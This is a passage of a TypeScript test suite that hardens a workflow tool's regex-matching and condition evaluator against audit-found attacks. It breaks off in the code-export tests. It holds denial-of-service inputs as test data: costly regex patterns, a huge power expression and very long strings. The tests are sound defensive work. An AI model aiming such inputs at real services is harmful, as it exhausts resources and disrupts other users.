// Security hardening for matches regex and the condition path around it: each
// case is an attack an audit of this feature tried.

import { RE2JS } from "re2js";
import { afterEach, describe, expect, it, vi } from "vitest";

vi.mock("server-only", () => ({}));

import { applyBigIntConversion } from "@/lib/bigint-condition-utils";
import { generateWorkflowCode } from "@/lib/workflow/codegen/codegen";
import { generateWorkflowSDKCode } from "@/lib/workflow/codegen/sdk";
import { commentSafe } from "@/lib/workflow/codegen/shared";
import { evaluateConditionExpression } from "@/lib/workflow/executor/executor.workflow";
import {
  editorConditionState,
  expressionToConditionGroup,
} from "@/lib/workflow/nodes/condition/builder-utils";
import {
  compileRegex,
  MAX_CONDITION_REGEX_WORK,
  MAX_RUN_REGEX_WORK,
  REGEX_ARITY_ERROR,
  REGEX_BACKSLASH_ERROR,
  REGEX_CALLS_ERROR,
  REGEX_NEGATED_ERROR,
  REGEX_WORKFLOW_COMPILE_ERROR,
  RegexBudget,
  RegexBudgetError,
  regexPatternError,
  workflowCompileError,
} from "@/lib/workflow/nodes/condition/regex-match";
import {
  isSafeConditionExpression,
  safeEvaluateCondition,
} from "@/lib/workflow/nodes/condition/safe-eval";
import {
  prepareRunRegex,
  preValidateConditionExpression,
  validateConditionExpression,
  validateConditionExpressionUI,
  visualConditionLimitError,
} from "@/lib/workflow/nodes/condition/validator";
import type { WorkflowNode } from "@/lib/workflow/store";
import {
  formatActionConfigValidationResponse,
  validateWorkflowActionConfigs,
} from "@/lib/workflow/validation/action-config";

const FIELD = "{{@n1:Webhook.value}}";

function run(expression: string, value: unknown): boolean {
  return evaluateConditionExpression(
    expression,
    { n1: { label: "Webhook", data: { value } } },
    new Map([["n1", {}]]),
    { n1: { success: true, data: { value } } }
  ).result;
}

describe("regex hardening", () => {
  afterEach(() => {
    vi.restoreAllMocks();
  });

  describe("compile cost", () => {
    it("charges compiles to the budget, so long distinct patterns cannot pile up", () => {
      const budget = new RegexBudget(5_000_000);
      expect(() => {
        for (let i = 0; i < 6; i++) {
          compileRegex(`^${i}${"a".repeat(500)}`, false, budget);
        }
      }).toThrow(
        "reached this node's matching limit of 5,000,000 while preparing the patterns. Each pattern costs 2,000 per character plus 400 per step"
      );
    });

    describe("a workflow's patterns must fit one run's budget", () => {
      // 140 characters each: 280,000 + 400 per step, so 16 distinct ones
      // cost over 5,000,000 and 8 about half.
      const pattern = (i: number) =>
        `^${String(i).padStart(2, "0")}${"a".repeat(137)}`;
      const call = (i: number) => `matchesRegex(${FIELD}, "${pattern(i)}")`;
      const calls = (from: number, count: number) =>
        Array.from({ length: count }, (_, i) => call(from + i)).join(" || ");
      const conditionNode = (
        id: string,
        config: Record<string, unknown>,
        enabled?: boolean
      ) => ({
        id,
        type: "action",
        data: {
          type: "action",
          label: id,
          enabled,
          config: { actionType: "Condition", ...config },
        },
      });
      const textNode = (id: string, condition: string) =>
        conditionNode(id, { condition });
      const runStart = (nodes: ReturnType<typeof conditionNode>[]) =>
        prepareRunRegex(
          nodes,
          new RegexBudget(MAX_RUN_REGEX_WORK, { scope: "run" })
        );
      const saveIssues = (nodes: ReturnType<typeof conditionNode>[]) =>
        validateWorkflowActionConfigs(nodes).issues;

      it("refuses one Condition over the cap at save and at run start", () => {
        const nodes = [textNode("c1", calls(0, 16))];
        expect(runStart(nodes)).toContain(REGEX_WORKFLOW_COMPILE_ERROR);
        expect(saveIssues(nodes)).toEqual([
          expect.objectContaining({
            path: "nodes[0].data.config.condition",
            nodeId: "c1",
            message: expect.stringContaining(REGEX_WORKFLOW_COMPILE_ERROR),
          }),
        ]);
      });

      // Each passes alone; together they would starve the run.
      it("adds up the patterns of every Condition, naming the costliest", () => {
        const nodes = [
          textNode("small", calls(0, 1)),
          textNode("c2", calls(1, 6)),
          textNode("big", calls(7, 8)),
        ];
        for (const node of nodes) {
          expect(saveIssues([node])).toEqual([]);
        }
        expect(saveIssues(nodes.slice(0, 2))).toEqual([]);
        expect(runStart(nodes)).toContain(REGEX_WORKFLOW_COMPILE_ERROR);
        expect(saveIssues(nodes)).toEqual([
          expect.objectContaining({
            nodeId: "big",
            message: expect.stringContaining(REGEX_WORKFLOW_COMPILE_ERROR),
          }),
        ]);
      });

      it("counts a pattern used in several Conditions once", () => {
        const nodes = ["c1", "c2", "c3"].map((id) =>
          textNode(id, calls(0, 12))
        );
        expect(saveIssues(nodes)).toEqual([]);
        expect(runStart(nodes)).toBeUndefined();
      });

      // The run evaluates the rules when there are any, whatever the text says.
      it("reads what the run evaluates: rules first, and not disabled nodes", () => {
        const rules = (from: number, count: number) => ({
          condition: "true",
          conditionConfig: {
            group: {
              id: "g",
              logic: "OR",
              rules: Array.from({ length: count }, (_, i) => ({
                id: `r${i}`,
                leftOperand: FIELD,
                operator: "matchesRegex",
                rightOperand: pattern(from + i),
              })),
            },
          },
        });
        const ruled = [conditionNode("c1", rules(0, 16))];
        expect(runStart(ruled)).toContain(REGEX_WORKFLOW_COMPILE_ERROR);
        expect(saveIssues(ruled)).toHaveLength(1);
        const badRule = conditionNode("c1", {
          conditionConfig: {
            group: {
              id: "g",
              logic: "AND",
              rules: [
                {
                  id: "r",
                  leftOperand: FIELD,
                  operator: "matchesRegex",
                  rightOperand: "(?=a)",
                },
              ],
            },
          },
        });
        expect(saveIssues([badRule])[0]?.message).toContain("Lookahead");
        // Stale text under rules that run is not counted.
        const stale = conditionNode("c1", {
          ...rules(0, 1),
          condition: calls(0, 16),
        });
        expect(saveIssues([stale])).toEqual([]);
        const off = [
          textNode("c1", calls(0, 8)),
          conditionNode("c2", { condition: calls(8, 8) }, false),
        ];
        expect(saveIssues(off)).toEqual([]);
        expect(runStart(off)).toBeUndefined();
      });

      // Compiled at run start, so no Condition pays again, and the run keeps
      // a full Condition's matching budget.
      it("leaves a run that passed room to test values", () => {
        const conditions = [calls(0, 8), calls(8, 6)];
        const runBudget = new RegexBudget(MAX_RUN_REGEX_WORK, { scope: "run" });
        expect(
          prepareRunRegex(
            conditions.map((c, i) => textNode(`c${i}`, c)),
            runBudget
          )
        ).toBeUndefined();
        const prepared = runBudget.used();
        expect(prepared).toBeLessThanOrEqual(
          MAX_RUN_REGEX_WORK - MAX_CONDITION_REGEX_WORK
        );
        for (const condition of conditions) {
          safeEvaluateCondition(
            condition.replaceAll(FIELD, "__v0"),
            { __v0: "b" },
            runBudget
          );
        }
        // Matching one character per pattern; one more compile would cost 280,000+.
        expect(runBudget.used()).toBeLessThan(prepared + 10_000);
        const heavy = '!matchesRegex(__v0, "(?i)(?:\\\\w?){450}x")';
        expect(() =>
          safeEvaluateCondition(heavy, { __v0: "a".repeat(4096) }, runBudget)
        ).not.toThrow();
      });

      it("refuses at save what fails every run, and leaves other conditions alone", () => {
        const refused = (condition: string) =>
          saveIssues([textNode("c1", condition)])[0]?.message;
        expect(refused(`matchesRegex(${FIELD}, "(?=a)")`)).toContain(
          "Lookahead"
        );
        expect(refused(`matchesRegex(${FIELD}, "a", 1)`)).toBe(
          REGEX_ARITY_ERROR
        );
        expect(refused(`matchesRegex(${FIELD}, "\\\\d")`)).toBeUndefined();
        expect(refused(`matchesRegex(${FIELD}, "\\d")`)).toBe(
          REGEX_BACKSLASH_ERROR
        );
        expect(
          refused(Array.from({ length: 17 }, () => call(0)).join(" || "))
        ).toBe(REGEX_CALLS_ERROR);
        expect(refused(`${call(0)} &&`)).toBeDefined();
        expect(refused(`${call(0)} && foo(1)`)).toBeDefined();
        expect(refused(`notMatchesRegex(${FIELD}, "^a")`)).toBe(
          REGEX_NEGATED_ERROR
        );
        // Saved conditions without matchesRegex are not checked.
        expect(refused(`${FIELD}  ===  "${"a".repeat(20_000)}"`)).toBe(
          undefined
        );
        expect(refused(`${FIELD} === "matchesRegex("`)).toBeUndefined();
      });

      // The summary escapes quotes against forged entries, but regex advice
      // needs its parentheses.
      it("keeps a pattern's parentheses in the save message", () => {
        const response = formatActionConfigValidationResponse(
          validateWorkflowActionConfigs([
            textNode("c1", `matchesRegex(${FIELD}, "a(")`),
          ])
        );
        expect(response.message).toContain("missing closing )");
        expect(response.message).toContain("'a('");
      });

      // Every compile is charged before it runs, so refused or uncached
      // patterns cannot make a check slow.
      it("stops compiling at the cap, so slow refused patterns cannot pile up", () => {
        const slow = (i: number) =>
          `matchesRegex(${FIELD}, "${"(?:a{1000})".repeat(45)}${i}")`;
        const nodes = Array.from({ length: 30 }, (_, i) =>
          textNode(`c${i}`, slow(i))
        );
        const budget = new RegexBudget(MAX_RUN_REGEX_WORK, { scope: "run" });
        const charge = vi.spyOn(budget, "chargeCompile");
        expect(prepareRunRegex(nodes, budget)).toContain(
          REGEX_WORKFLOW_COMPILE_ERROR
        );
        // A refused pattern is charged its length only (990,000), then skipped.
        expect(charge.mock.calls.length).toBeLessThanOrEqual(6);
        expect(saveIssues(nodes)).toHaveLength(1);
        expect(isSafeConditionExpression(slow(99).replace(FIELD, "x"))).toBe(
          true
        );
      });

      it("says how far over the cap, and names the costliest Condition", () => {
        // The cap is crossed in "ten"; "sixteen", after it, costs the most.
        const nodes = [
          textNode("six", calls(0, 6)),
          textNode("ten", calls(10, 10)),
          textNode("sixteen", calls(30, 16)),
        ];
        const started = runStart(nodes);
        expect(started).toMatch(/about \d{3}% of the limit/);
        expect(started).toContain('Most are in "sixteen"');
        expect(saveIssues(nodes)).toEqual([
          expect.objectContaining({
            nodeId: "sixteen",
            message: expect.stringContaining("This Condition has the most"),
          }),
        ]);
      });

      // Checked on the raw text, before any Condition is parsed or compiled.
      it("caps how many regex Conditions a workflow has, and their text", () => {
        const many = Array.from({ length: 33 }, (_, i) =>
          textNode(`c${i}`, call(0))
        );
        expect(saveIssues(many.slice(0, 32))).toEqual([]);
        expect(saveIssues(many)).toEqual([
          expect.objectContaining({
            nodeId: "c32",
            message: expect.stringContaining(
              "This workflow has 33 Conditions with a regex test; the limit is 32"
            ),
          }),
        ]);
        expect(runStart(many)).toContain("the limit is 32");

        // One pattern called 16 times and a long literal: about 9,900 each.
        const sixteen = Array.from({ length: 16 }, () => call(0)).join(" || ");
        const padded = (id: string, extra = 0) =>
          textNode(
            id,
            `${sixteen} || ${FIELD} === "${"x".repeat(7200 + extra)}"`
          );
        const long = [
          ...Array.from({ length: 10 }, (_, i) => padded(`p${i}`)),
          padded("longest", 50),
        ];
        expect(saveIssues(long.slice(0, 10))).toEqual([]);
        const budget = new RegexBudget(MAX_RUN_REGEX_WORK, { scope: "run" });
        const charge = vi.spyOn(budget, "chargeCompile");
        const started = prepareRunRegex(long, budget);
        expect(started).toContain("the limit is 100,000");
        expect(started).toContain('Most are in "longest"');
        expect(charge).not.toHaveBeenCalled();
        expect(saveIssues(long)).toEqual([
          expect.objectContaining({
            nodeId: "longest",
            message: expect.stringContaining("This Condition has the most"),
          }),
        ]);
        // Exactly at the limit, then one character over it.
        const exact = (extra: number) => [
          ...Array.from({ length: 10 }, (_, i) =>
            textNode(
              `e${i}`,
              `${FIELD} === "${"x".repeat(9700)}" || ${call(0)}`
            )
          ),
          textNode("last", `${call(0)} || ${FIELD} === "${"y".repeat(extra)}"`),
        ];
        const lengthOf = (nodes: ReturnType<typeof textNode>[]) =>
          nodes.reduce(
            (sum, node) =>
              sum +
              String(
                (node.data.config as Record<string, unknown>).condition
              ).replaceAll(FIELD, "__v0").length,
            0
          );
        const at = exact(0);
        const pad = 100_000 - lengthOf(at);
        expect(lengthOf(exact(pad))).toBe(100_000);
        expect(saveIssues(exact(pad))).toEqual([]);
        expect(runStart(exact(pad))).toBeUndefined();
        expect(saveIssues(exact(pad + 1))[0]?.message).toContain(
          "the limit is 100,000"
        );
        expect(runStart(exact(pad + 1))).toContain("the limit is 100,000");

        // Conditions without matchesRegex are not counted.
        expect(
          saveIssues([
            ...long.slice(0, 10),
            textNode("plain", `${FIELD} === "${"x".repeat(50_000)}"`),
          ])
        ).toEqual([]);
      });

      // Past the cap the rest are measured, not guessed from their length:
      // 11 characters of [a-z]x{990} compile to 993 steps.
      it("measures patterns past the cap by their steps, in any order", () => {
        const literal = Array.from(
          { length: 5 },
          (_, i) => `matchesRegex(${FIELD}, "^${i}${"a".repeat(448)}")`
        ).join(" || ");
        const repeats = Array.from(
          { length: 16 },
          (_, i) =>
            `matchesRegex(${FIELD}, "[a-z]${"abcdefghijklmnop"[i]}{990}")`
        ).join(" || ");
        for (const nodes of [
          [textNode("literal", literal), textNode("repeats", repeats)],
          [textNode("repeats", repeats), textNode("literal", literal)],
        ]) {
          const started = runStart(nodes) ?? "";
          expect(started).toContain('Most are in "repeats"');
          const share = Number(/about (\d+)% of the limit/.exec(started)?.[1]);
          expect(share).toBeGreaterThan(230);
          expect(saveIssues(nodes)[0]?.nodeId).toBe("repeats");
        }
      });

      // Measuring past the cap is bounded too: past 400% it says "more than".
      it("says more than 400% rather than measure without end", () => {
        const nodes = Array.from({ length: 5 }, (_, i) =>
          textNode(`c${i}`, calls(i * 16, 16))
        );
        const started = runStart(nodes) ?? "";
        expect(started).toMatch(/more than \d{3}% of the limit/);
        // Not all were measured, so no Condition is named as having the most.
        expect(started).not.toContain("Most are in");
        const saved = saveIssues(nodes)[0]?.message ?? "";
        expect(saved).toMatch(/more than \d{3}%/);
        expect(saved).not.toContain("has the most");
      });

      // One Condition over every total is told its own limit, not the total's.
      it("names one Condition's own length before the workflow's total", () => {
        const huge = textNode(
          "huge",
          `${call(0)} || ${FIELD} === "${"x".repeat(100_100)}"`
        );
        expect(saveIssues([huge])[0]?.message).toContain(
          "This condition is too long to run with matchesRegex"
        );
        // Not in the total, but refused at run start, before any step runs.
        expect(runStart([huge])).toContain(
          'The Condition "huge" is too long to run with matchesRegex'
        );
        const small = textNode("small", call(0));
        for (const nodes of [
          [huge, small],
          [small, huge],
        ]) {
          expect(runStart(nodes)).toContain('The Condition "huge" is too long');
        }
        const unnamed = { ...huge, data: { ...huge.data, label: "" } };
        expect(runStart([unnamed])).toContain(
          "A Condition with no name is too long"
        );
      });

      // Rules are named as rules, wherever the message is read.
      it("words a Condition built from rules as rules", () => {
        const ruled = conditionNode("ruled", {
          conditionConfig: {
            group: {
              id: "g",
              logic: "OR",
              rules: [
                {
                  id: "a",
                  leftOperand: FIELD,
                  operator: "matchesRegex",
                  rightOperand: "^a",
                },
                {
                  id: "b",
                  leftOperand: FIELD,
                  operator: "===",
                  rightOperand: "x".repeat(12_000),
                },
              ],
            },
          },
        });
        expect(saveIssues([ruled])[0]?.message).toContain(
          "These rules are too long to run with a regex test"
        );
        expect(runStart([ruled])).toContain(
          'The Condition "ruled" is too long to run with a regex test'
        );
      });

      it("says what to do, and names a label as one safe line", () => {
        const nodes = [
          textNode("six", calls(0, 6)),
          conditionNode("x", { condition: calls(10, 10) }),
        ];
        nodes[1].data.label = 'Big "list"\nnext line';
        const started = runStart(nodes) ?? "";
        expect(started).toContain("Most are in \"Big 'list' next line\"");
        // A long label is cut whole characters at a time.
        nodes[1].data.label = "\u{1F600}".repeat(40);
        expect(runStart(nodes)).not.toMatch(
          /[\ud800-\udbff](?![\udc00-\udfff])/
        );
        expect(started).toContain("reuse one pattern");
        expect(saveIssues(nodes)[0]?.message).toContain(
          "This Condition has the most. Shorten them"
        );
      });

      // A lower bound rounds down, so "more than" stays true.
      it("rounds a share it could not fully measure down", () => {
        expect(workflowCompileError(19_980_000, true)).toContain(
          "more than 399% of the limit"
        );
        expect(workflowCompileError(19_980_000)).toContain(
          "about 400% of the limit"
        );
      });

      it("counts a pattern once whichever quotes it is written in", () => {
        const single = (from: number, count: number) =>
          Array.from(
            { length: count },
            (_, i) => `matchesRegex(${FIELD}, '${pattern(from + i)}')`
          ).join(" || ");
        const nodes = [
          textNode("c1", calls(0, 8)),
          textNode("c2", single(0, 8)),
        ];
        expect(saveIssues(nodes)).toEqual([]);
        expect(runStart(nodes)).toBeUndefined();
      });
    });

    // Splitting a long list would only meet the workflow total.
    it("points a long pattern at equals rules or Filter Array", () => {
      expect(regexPatternError("a".repeat(600))).toContain(
        "use equals rules joined with OR, or Filter Array"
      );
    });

    it("remembers a refused pattern instead of compiling it again", () => {
      const heavy = "(?:a{1000})".repeat(46);
      const compile = vi.spyOn(RE2JS, "compile");
      expect(regexPatternError(heavy)).toContain("too complex");
      expect(regexPatternError(heavy)).toContain("too complex");
      expect(compile).toHaveBeenCalledTimes(1);
    });

    it("charges a compile once per run, the same whether or not it is cached", () => {
      const pattern = `^${"q".repeat(400)}`;
      // A cached compile is still charged: 401 x 2,000 for the length plus
      // the compiled steps x 400, more than 900,000.
      compileRegex(pattern, false);
      expect(() =>
        compileRegex(pattern, false, new RegexBudget(900_000))
      ).toThrow(RegexBudgetError);
      // Within one run it is paid once, whichever node budget asks.
      const runBudget = new RegexBudget(1_000_000, { scope: "run" });
      for (let i = 0; i < 3; i++) {
        const node = new RegexBudget(1_000_000, { parent: runBudget });
        expect(() => compileRegex(pattern, false, node)).not.toThrow();
      }
    });

    // A Condition's own budget is for matching, so whether it fits does not
    // depend on which earlier Conditions compiled the same pattern.
    it("charges compiles to the run, not the Condition", () => {
      const pattern = `^${"r".repeat(400)}`;
      const runBudget = new RegexBudget(2_000_000, { scope: "run" });
      const node = new RegexBudget(10, { parent: runBudget });
      expect(() => compileRegex(pattern, false, node)).not.toThrow();
    });

    // About 56,000 to compile once, then 46 steps x 42 characters per test.
    it("lets a For Each test 5,000 addresses against one pattern", () => {
      const runBudget = new RegexBudget(MAX_RUN_REGEX_WORK, { scope: "run" });
      const condition = `matchesRegex(${FIELD}, "^0x[0-9a-fA-F]{40}$")`;
      const value = `0x${"ab".repeat(20)}`;
      const outputs = { n1: { label: "Webhook", data: { value } } };
      const results = { n1: { success: true, data: { value } } };
      const nodes = new Map([["n1", {}]]);
      for (let i = 0; i < 5000; i++) {
        expect(
          evaluateConditionExpression(
            condition,
            outputs,
            nodes,
            results,
            runBudget
          ).result
        ).toBe(true);
      }
    });

    it("charges by compiled steps, so a short expanding pattern is not cheap", () => {
      const budget = new RegexBudget(300_000);
      expect(() => compileRegex("x\\pL{990}", false, budget)).toThrow(
        RegexBudgetError
      );
    });
  });

  describe("run budget", () => {
    it("caps the regex work of all Conditions in one run, loops included", () => {
      const runBudget = new RegexBudget(MAX_RUN_REGEX_WORK, { scope: "run" });
      const text = "a".repeat(4096);
      const call = '!matchesRegex(__v0, "(?i)(?:\\\\w?){450}x")';
      // Each evaluation fits its own 5 million; the run's 10 million stops it
      // after two or three.
      let evaluations = 0;
      expect(() => {
        for (let i = 0; i < 100; i++) {
          safeEvaluateCondition(call, { __v0: text }, runBudget);
          evaluations++;
        }
      }).toThrow("reached the run's matching limit");
      expect(evaluations).toBeGreaterThan(0);
      expect(evaluations).toBeLessThan(4);
    });
  });

  describe("condition size", () => {
    it("refuses a regex condition over 10,000 characters in every check", () => {
      const long = `matchesRegex(${FIELD}, "a") || ${FIELD} === "${"a".repeat(10_000)}"`;
      for (const result of [
        preValidateConditionExpression(long),
        validateConditionExpression(long),
        validateConditionExpressionUI(long),
      ]) {
        expect(result).toEqual({
          valid: false,
          error: expect.stringContaining("the limit is 10,000"),
        });
      }
    });

    // The maintainer's case, made larger: a saved allow-list of 300 address
    // rules with no regex keeps running.
    it("leaves long conditions without matchesRegex running", () => {
      const rule = (i: number): string =>
        `{{@node_${String(i).padStart(16, "0")}:Label.from}} === "0x${String(i).padStart(40, "0")}"`;
      const long = Array.from({ length: 300 }, (_, i) => rule(i)).join(" || ");
      const resolved = Array.from(
        { length: 300 },
        (_, i) => `__v${i} === "0x${String(i).padStart(40, "0")}"`
      ).join(" || ");
      expect(resolved.length).toBeGreaterThan(10_000);
      expect(preValidateConditionExpression(long)).toEqual({ valid: true });
      expect(validateConditionExpressionUI(long)).toEqual({ valid: true });
      expect(validateConditionExpression(resolved)).toEqual({ valid: true });
    });

    // Each shape took seconds at this size before; quadratic would again.
    it("checks a 50,000-character condition in linear time", () => {
      const n = 50_000;
      const timed = (run: () => unknown): number => {
        const started = performance.now();
        run();
        return performance.now() - started;
      };
      for (const text of [
        `${"a".repeat(n)} == 1`,
        `__v0 ==${" ".repeat(n)}1`,
        "a[".repeat(n / 2),
        Array.from({ length: n / 6 }, () => '"a"').join(" || "),
        "1,".repeat(n / 2),
        `__v0.includes(${"1,".repeat(n / 2)}1)`,
      ]) {
        expect(timed(() => validateConditionExpression(text))).toBeLessThan(
          1000
        );
        expect(timed(() => preValidateConditionExpression(text))).toBeLessThan(
          1000
        );
        expect(timed(() => validateConditionExpressionUI(text))).toBeLessThan(
          1000
        );
      }
      for (const text of [
        `__v0${" ".repeat(n)}x`,
        `${"x < ".repeat(n / 4)}\ny`,
      ]) {
        expect(timed(() => editorConditionState(text, undefined))).toBeLessThan(
          1000
        );
      }
    });

    // A line break may sit next to the operator; the operands hold none. The
    // rules rebuild without it, so the editor opens such text as text.
    it("still reads a comparison split across lines", () => {
      for (const condition of [`${FIELD}\n=== 5`, `${FIELD} ===\n5`]) {
        expect(expressionToConditionGroup(condition)?.rules[0]).toMatchObject({
          leftOperand: FIELD,
          operator: "===",
          rightOperand: "5",
        });
        expect(editorConditionState(condition, undefined).initialMode).toBe(
          "expression"
        );
      }
    });

    // The parse never reads across a line break, so such text is not parsed.
    it("opens text with a line break as text, unparsed", () => {
      const rule = `${FIELD} === "a" || `;
      const long = `${rule.repeat(2500)}\n${FIELD} === "b"`;
      const started = performance.now();
      expect(editorConditionState(long, undefined)).toEqual({
        parsedGroup: null,
        initialMode: "expression",
      });
      expect(performance.now() - started).toBeLessThan(50);
      expect(
        editorConditionState(`${FIELD} === "a\nb"`, undefined).initialMode
      ).toBe("expression");
    });

    // Opening a node saves the parsed rules, which then run, so a parse that
    // does not rebuild the text must not become rules.
    it("opens a condition its rules cannot rebuild as text", () => {
      for (const condition of [
        `${FIELD} === 1\n|| ${FIELD} === 2`,
        `${FIELD} +\n1 === 2`,
        `(${FIELD}\n=== 1)`,
      ]) {
        expect(editorConditionState(condition, undefined)).toEqual({
          parsedGroup: null,
          initialMode: "expression",
        });
      }
      expect(
        editorConditionState(`${FIELD} === 1 || ${FIELD} === 2`, undefined)
          .initialMode
      ).toBe("visual");
    });

    // The bracket check reads the content up to the first "]", as before.
    it("still refuses nested brackets", () => {
      for (const [condition, error] of [
        ["__v0[__v1[0]] === 1", 'Invalid bracket content: "[__v1[0]"'],
        ["__v0[[0]] === 1", 'Invalid bracket content: "[[0]"'],
        ["foo__v0[__v1[0]] === 1", 'Cannot index "foo__v0[...]"'],
      ]) {
        expect(validateConditionExpression(condition)).toEqual({
          valid: false,
          error: expect.stringContaining(error),
        });
      }
    });

    it("caps a regex condition at exactly 10,000 characters", () => {
      const sized = (length: number): string => {
        const head = 'matchesRegex(__v0, "a") || __v0 === "';
        return `${head}${"a".repeat(length - head.length - 1)}"`;
      };
      for (const check of [
        preValidateConditionExpression,
        validateConditionExpression,
        validateConditionExpressionUI,
      ]) {
        expect(check(sized(10_000))).toEqual({ valid: true });
        expect(check(sized(10_001)).valid).toBe(false);
      }
      // The editor measures the saved text, spaces included, as the run does.
      expect(validateConditionExpressionUI(`  ${sized(10_000)}  `).valid).toBe(
        false
      );
      // The name only inside quotes is not a regex test.
      const quoted = `__v0 === "matchesRegex(${"a".repeat(10_000)}"`;
      expect(validateConditionExpression(quoted)).toEqual({ valid: true });
      // An unclosed quote is still measured.
      expect(
        validateConditionExpression(
          `matchesRegex(__v0, "a") || "${"a".repeat(10_000)}`
        )
      ).toEqual({
        valid: false,
        error: expect.stringContaining("the limit is 10,000"),
      });
    });

    it("shows the visual limits before a run", () => {
      const rules = (count: number): string =>
        Array.from({ length: count }, () => `matchesRegex(${FIELD}, "a")`).join(
          " || "
        );
      expect(visualConditionLimitError(rules(17), 17)).toBe(
        "A Condition can have at most 16 regex tests. Split them across two Condition nodes"
      );
      const long = `${rules(1)} || ${FIELD} === "${"a".repeat(10_000)}"`;
      expect(visualConditionLimitError(long, 1)).toContain(
        "These rules are too long to run with a regex test"
      );
      expect(visualConditionLimitError(long, 1)).toContain("Split them across");
      expect(
        visualConditionLimitError(`${FIELD} === "${"a".repeat(10_000)}"`, 0)
      ).toBeUndefined();
    });

    it("opens a condition with more regex tests than allowed as text", () => {
      const calls = Array.from(
        { length: 17 },
        () => `matchesRegex(${FIELD}, "a")`
      ).join(" || ");
      expect(editorConditionState(calls, undefined)).toEqual({
        parsedGroup: null,
        initialMode: "expression",
      });
    });
  });

  describe("expression mode", () => {
    // A flags argument is a JavaScript habit; RE2 takes (?i) in the pattern.
    it("says how to ignore case when given a third value", () => {
      expect(
        validateConditionExpressionUI(`matchesRegex(${FIELD}, "^a", "i")`)
      ).toEqual({
        valid: false,
        error: expect.stringContaining("start the pattern with (?i)"),
      });
    });

    it("asks for quotes around a pattern typed without them", () => {
      for (const condition of [
        `matchesRegex(${FIELD}, ^0x)`,
        `matchesRegex(${FIELD}, /^0x/i)`,
      ]) {
        for (const result of [
          preValidateConditionExpression(condition),
          validateConditionExpressionUI(condition),
        ]) {
          expect(result).toEqual({
            valid: false,
            error: expect.stringContaining("Write the regex pattern as one"),
          });
        }
      }
    });

    it("refuses a comma outside call parentheses", () => {
      expect(validateConditionExpressionUI(`${FIELD}, 1`).valid).toBe(false);
      expect(validateConditionExpression("__v0, 1")).toEqual({
        valid: false,
        error: 'Condition contains disallowed syntax: ","',
      });
      expect(validateConditionExpression('__v0.includes("a", 1)')).toEqual({
        valid: true,
      });
    });

    it("refuses notMatchesRegex(...) as a function, before any run", () => {
      const condition = `notMatchesRegex(${FIELD}, "a")`;
      for (const result of [
        preValidateConditionExpression(condition),
        validateConditionExpressionUI(condition),
      ]) {
        expect(result).toEqual({
          valid: false,
          error: expect.stringContaining("write !matchesRegex(...)"),
        });
      }
      expect(
        preValidateConditionExpression(`${FIELD} === "notMatchesRegex(x)"`)
      ).toEqual({ valid: true });
    });

    it("reads no rules from a condition whose quote is never closed", () => {
      expect(editorConditionState(`${FIELD} === "open`, undefined)).toEqual({
        parsedGroup: null,
        initialMode: "expression",
      });
    });
  });

  describe("values", () => {
    it("refuses a value that is undefined, e.g. from a node that did not run", () => {
      for (const expression of [
        'matchesRegex(__v0, "^0x")',
        '!matchesRegex(__v0, "^0x")',
      ]) {
        expect(() =>
          safeEvaluateCondition(expression, { __v0: undefined })
        ).toThrow("got no value");
      }
    });
  });

  describe("large-integer mode", () => {
    it("caps the size of a power result", () => {
      const started = performance.now();
      expect(() =>
        run(
          `${FIELD} === "x" && 9007199254740993 > 1 && 7 ** 30000000 > 1`,
          "x"
        )
      ).toThrow("too large");
      expect(performance.now() - started).toBeLessThan(1000);
      expect(run(`${FIELD} === "x" && 2 ** 64 > 9007199254740993`, "x")).toBe(
        true
      );
    });

    it("raises 0, 1 and -1 to any power", () => {
      for (const [base, power] of [
        [BigInt(1), BigInt(1)],
        [BigInt(0), BigInt(0)],
        [BigInt(-1), BigInt(1)],
      ]) {
        expect(
          safeEvaluateCondition("__v0 ** __v1", {
            __v0: base,
            __v1: BigInt(100_000),
          })
        ).toBe(power);
      }
      expect(() =>
        safeEvaluateCondition("__v0 ** __v1", {
          __v0: BigInt(2),
          __v1: BigInt(100_000),
        })
      ).toThrow("too large");
    });

    it("tests the value as resolved, leading zeros included", () => {
      const data = { balance: "2000000000000000000000", zip: "01234" };
      const evaluate = (condition: string): boolean =>
        evaluateConditionExpression(
          condition,
          { n1: { label: "Webhook", data } },
          new Map([["n1", {}]]),
          { n1: { success: true, data } }
        ).result;
      const big = "{{@n1:Webhook.balance}} > 1000000000000000000000";
      const zip = '"^0\\\\d{4}$"';
      expect(
        evaluate(`${big} && matchesRegex({{@n1:Webhook.zip}}, ${zip})`)
      ).toBe(true);
      expect(
        evaluate(`${big} && !matchesRegex({{@n1:Webhook.zip}}, "^1234$")`)
      ).toBe(true);
    });

    // Typed numbers are numbers there too, so arithmetic works as outside the mode.
    it("computes the tested value as it would outside large-integer mode", () => {
      const data = { balance: "2000000000000000000000", n: "5" };
      expect(
        evaluateConditionExpression(
          '{{@n1:Webhook.balance}} > 1000000000000000000000 && matchesRegex(String({{@n1:Webhook.n}} * 2), "^10$")',
          { n1: { label: "Webhook", data } },
          new Map([["n1", {}]]),
          { n1: { success: true, data } }
        ).result
      ).toBe(true);
    });

    it("leaves a number after a dot, $ or [ alone", () => {
      const { expression } = applyBigIntConversion(
        "__v0.5 === 1 && __v1.$7 > 3 && __v2[0] === 9007199254740993",
        { __v0: "1" }
      );
      expect(expression).toContain("__v0.5 ");
      expect(expression).toContain("__v1.$7 ");
      expect(expression).toContain("__v2[0]");
    });
  });

  describe("Filter Array settings", () => {
    function filterNode(config: Record<string, unknown>): WorkflowNode {
      return {
        id: "f1",
        type: "action",
        position: { x: 0, y: 0 },
        data: {
          label: "Filter",
          type: "action",
          config: { actionType: "data/filter", source: "[]", ...config },
        },
      } as WorkflowNode;
    }

    it("refuses Ignore case or the operator taken from another node", () => {
      for (const [config, text] of [
        [
          { operator: "matchesRegex", value: "^a", ignoreCase: "{{@n1:W.ic}}" },
          "Ignore case does not take a template",
        ],
        // The select check refuses it first; either way it never saves.
        [{ operator: "{{@n1:W.op}}", value: "a" }, "operator"],
      ] as const) {
        const result = validateWorkflowActionConfigs([filterNode(config)]);
        expect(result.valid).toBe(false);
        expect(JSON.stringify(result.issues)).toContain(text);
      }
    });
  });

  describe("code export", () => {
    function exported(condition: string, label = "Check"): string {
      return generateWorkflowSDKCode(
        "wf",
        [
          {
            id: "t",
            type: "trigger",
            position: { x: 0, y: 0 },
            data: { label: "Trigger", type: "trigger", config: {} },
          },
          {
            id: "c",
            type: "action",
            position: { x: 0, y: 0 },
            data: {
              label,
              type: "action",
              config: { actionType: "Condition", condition },
            },
          },
          {
            id: "n",
            type: "action",
            position: { x: 0, y: 0 },
            data: {
